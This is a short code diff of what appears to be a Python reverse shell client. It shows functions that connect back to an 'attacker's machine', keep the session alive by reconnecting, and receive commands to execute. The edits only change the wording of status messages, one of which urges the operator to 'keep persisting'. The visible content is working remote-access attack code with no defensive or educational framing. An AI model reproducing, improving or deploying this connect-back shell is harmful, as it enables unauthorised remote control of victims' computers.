@@ -15,7 +15,7 @@ def parse_args():
 
 def connect(host, port):
 	s = socket.socket()
-	print("[*] Attempting to connect back to attacker's machine on {}...".format(port))
+	print("[*] Attempting to connect back to attacker's machine on tcp:{} ...".format(port))
 	s.connect((host, port))
 	return s
 
@@ -27,7 +27,8 @@ def wait(s):
 		s.close()
 		sys.exit(0)
 	elif len(data) == 0:
-		print("[!] Session lost! Auto-reconnect ...")
+		print("[!] Session lost! Don't worry, keep persisting¡!")
+		print("------------------------------------------------")
 		return True
 	else:
 		print("[*] Entering command: {} ".format(data))
